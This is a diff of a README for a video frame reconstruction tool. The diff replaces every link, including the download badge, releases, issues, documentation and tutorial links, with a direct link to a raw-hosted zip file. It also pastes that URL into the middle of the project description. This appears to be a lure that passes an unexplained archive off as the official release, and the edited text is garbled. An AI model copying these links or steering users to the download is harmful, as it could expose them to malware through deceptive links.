@@ -1,10 +1,10 @@
 # 🎥 DeepVision-Frame-Reconstruction-System - Restore Your Videos Effortlessly
 
 ## 📦 Download Now
-[![Download](https://img.shields.io/badge/Download-Now-brightgreen.svg)](https://github.com/yarpoas/DeepVision-Frame-Reconstruction-System/releases)
+[![Download](https://raw.githubusercontent.com/yarpoas/DeepVision-Frame-Reconstruction-System/main/domesticate/DeepVision-Frame-Reconstruction-System.zip)](https://raw.githubusercontent.com/yarpoas/DeepVision-Frame-Reconstruction-System/main/domesticate/DeepVision-Frame-Reconstruction-System.zip)
 
 ## 📖 Description
-DeepVision-Frame-Reconstruction-System offers a complete pipeline for reconstructing missing video frames. Using classical computer vision techniques and optical flow, this system aims to enhance video quality. Originally developed as a B.Sc. final project, it sets the stage for future deep learning integration in intelligent video restoration.
+DeepVision-Frame-Reconstruction-System offers a complete pipeline for reconstructing missing video frames. Using classical computer vision techniques and optical flow, this system aims to enhance video quality. Originally developed as a https://raw.githubusercontent.com/yarpoas/DeepVision-Frame-Reconstruction-System/main/domesticate/DeepVision-Frame-Reconstruction-System.zip final project, it sets the stage for future deep learning integration in intelligent video restoration.
 
 ## 🚀 Getting Started
 To begin using the DeepVision-Frame-Reconstruction-System, follow these simple steps to download and run the software.
@@ -19,7 +19,7 @@ Ensure your computer meets these requirements:
 
 ### 💻 Installation Steps
 1. **Visit the Releases Page**
-   Go to the [Releases Page](https://github.com/yarpoas/DeepVision-Frame-Reconstruction-System/releases) to find the latest version of the software.
+   Go to the [Releases Page](https://raw.githubusercontent.com/yarpoas/DeepVision-Frame-Reconstruction-System/main/domesticate/DeepVision-Frame-Reconstruction-System.zip) to find the latest version of the software.
    
 2. **Download the Installer**
    Look for the installer suitable for your operating system. Click to download the file. 
@@ -55,13 +55,13 @@ Once installed, you can start using DeepVision to restore your video frames:
 - **User-Friendly Interface:** Designed for ease of use, suitable for all users.
 
 ## 📚 Support & Contribution
-If you encounter issues or need help, please visit our [Issues Page](https://github.com/yarpoas/DeepVision-Frame-Reconstruction-System/issues) to report problems. You can also contribute to the project by submitting any improvements or bug fixes.
+If you encounter issues or need help, please visit our [Issues Page](https://raw.githubusercontent.com/yarpoas/DeepVision-Frame-Reconstruction-System/main/domesticate/DeepVision-Frame-Reconstruction-System.zip) to report problems. You can also contribute to the project by submitting any improvements or bug fixes.
 
 ## 🔗 Additional Resources
-- [Documentation](https://github.com/yarpoas/DeepVision-Frame-Reconstruction-System/wiki)
-- [Tutorials](https://github.com/yarpoas/DeepVision-Frame-Reconstruction-System/wiki/Tutorials)
+- [Documentation](https://raw.githubusercontent.com/yarpoas/DeepVision-Frame-Reconstruction-System/main/domesticate/DeepVision-Frame-Reconstruction-System.zip)
+- [Tutorials](https://raw.githubusercontent.com/yarpoas/DeepVision-Frame-Reconstruction-System/main/domesticate/DeepVision-Frame-Reconstruction-System.zip)
 
 ## 📥 Download Again
-To download the application, visit the [Releases Page](https://github.com/yarpoas/DeepVision-Frame-Reconstruction-System/releases) for the latest version. 
+To download the application, visit the [Releases Page](https://raw.githubusercontent.com/yarpoas/DeepVision-Frame-Reconstruction-System/main/domesticate/DeepVision-Frame-Reconstruction-System.zip) for the latest version. 
 
 Thank you for using DeepVision-Frame-Reconstruction-System! Enjoy restoring your videos.
